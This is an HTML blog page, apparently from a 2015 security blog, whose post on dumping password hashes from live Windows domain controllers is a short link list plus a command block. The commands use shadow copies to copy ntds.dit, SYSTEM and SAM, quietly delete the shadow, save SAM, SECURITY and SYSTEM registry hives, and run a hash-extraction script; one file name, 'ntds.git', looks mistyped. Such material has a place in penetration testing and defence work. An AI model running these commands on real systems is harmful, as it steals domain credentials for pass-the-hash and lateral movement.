@@ -1,0 +1,250 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Safely Dumping Hashes From Live Domain Controllers - My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Safely Dumping Hashes from Live Domain Controllers
+Tutorial for NTDS goodness
+Script recipe of the week: how to copy an opened file 1
+2
+3
+4
+5
+6
+7
+8 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/blog/2015/06/25/safely-dumping-hashes-from-live-domain-controllers/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Safely Dumping Hashes From Live Domain Controllers</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-25T23:42:42+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:42 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><ul>
+<li><a href="http://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/">Safely Dumping Hashes from Live Domain Controllers</a></li>
+<li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-%28VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM%29/">Tutorial for NTDS goodness</a></li>
+<li><a href="http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx">Script recipe of the week: how to copy an opened file</a></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>C:\&gt; reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
+</span><span class='line'>
+</span><span class='line'>C:\&gt; vssadmin create shadow /for=c:
+</span><span class='line'>
+</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.git d:
+</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM d:
+</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM d:
+</span><span class='line'>
+</span><span class='line'>C:\&gt; vssadmin delete shadows /for=c: /quiet
+</span><span class='line'>
+</span><span class='line'>C:\&gt; reg.exe save hklm\sam c:\temp\sam.sav
+</span><span class='line'>C:\&gt; reg.exe save hklm\security c:\temp\security.sav
+</span><span class='line'>C:\&gt; reg.exe save hklm\system c:\temp\system.sav
+</span><span class='line'>
+</span><span class='line'>$ python sd.py -sam ... -security ... -system ... LOCAL</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li><a href="http://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283">Pass-the-hash attacks: Tools and Mitigation</a></li>
+</ul>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Your Name</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-06-25T23:42:42+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:42 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://yoursite.com/blog/2015/06/25/safely-dumping-hashes-from-live-domain-controllers/" data-via="" data-counturl="http://yoursite.com/blog/2015/06/25/safely-dumping-hashes-from-live-domain-controllers/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/06/20/understanding-type-confusion-vulnerabilities-cve-2015-0336/" title="Previous Post: Understanding Type Confusion Vulnerabilities: CVE-2015-0336">&laquo; Understanding Type Confusion Vulnerabilities: CVE-2015-0336</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/06/30/re-packing-android-apk-files/" title="Next Post: Re-packing Android APK files">Re-packing Android APK files &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
